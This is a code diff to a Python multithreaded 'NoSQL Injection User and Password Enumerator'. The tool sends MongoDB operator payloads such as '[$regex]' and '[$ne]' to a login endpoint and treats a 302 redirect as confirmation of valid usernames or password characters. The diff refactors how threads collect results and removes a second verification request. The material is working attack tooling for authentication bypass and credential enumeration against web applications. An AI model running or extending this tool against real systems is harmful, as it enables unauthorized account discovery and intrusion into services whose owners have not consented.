@@ -7,10 +7,6 @@ import concurrent.futures
 from colorama import Fore
 from urllib3.util import Retry
 from requests.adapters import HTTPAdapter
-import threading
-
-valid_usernames = set()
-lock = threading.Lock()
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="NoSQL Injection User and Password Enumerator")
@@ -48,23 +44,10 @@ def process_payload(payload, characters, url, method, enum_parameter, password_p
         r.raise_for_status()
 
         if r.status_code == 302:
-            # Check if the payload is a valid username
-            para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-            try:
-                r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
-                r.raise_for_status()
-
-                if r.status_code == 302:
-                    with lock:
-                        valid_usernames.add(payload)
-                    return payload  # Only return the payload if a match is found
-
-            except requests.exceptions.RequestException as e:
-                print(Fore.RED + "Error occurred during request:", e)
+            return payload  # Only return the payload if a match is found
 
     except requests.exceptions.RequestException as e:
         print(Fore.RED + "Error occurred during request:", e)
-
 
 def main():
     args = get_arguments()
@@ -89,14 +72,20 @@ def main():
     valid_usernames = set()
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-        results = executor.map(process_payload, payloads, [characters] * len(payloads), [url] * len(payloads), [method] * len(payloads),
-                               [enum_parameter] * len(payloads), [password_parameter] * len(payloads), [other_parameters] * len(payloads), [session] * len(payloads))
+        results = []
+        for payload in payloads:
+            results.append(executor.submit(process_payload, payload, characters, url, method, enum_parameter, password_parameter, other_parameters, session))
         
-        for userpass in results:
+        for future in concurrent.futures.as_completed(results):
+            userpass = future.result()
             if userpass:
-                print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
+                valid_usernames.add(userpass)
 
-    if not valid_usernames:
+    if valid_usernames:
+        print(f"{len(valid_usernames)} {enum_parameter}(s) found:")
+        for userpass in valid_usernames:
+            print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
+    else:
         print(Fore.RED + f"No {enum_parameter} found")
 
 if __name__ == "__main__":
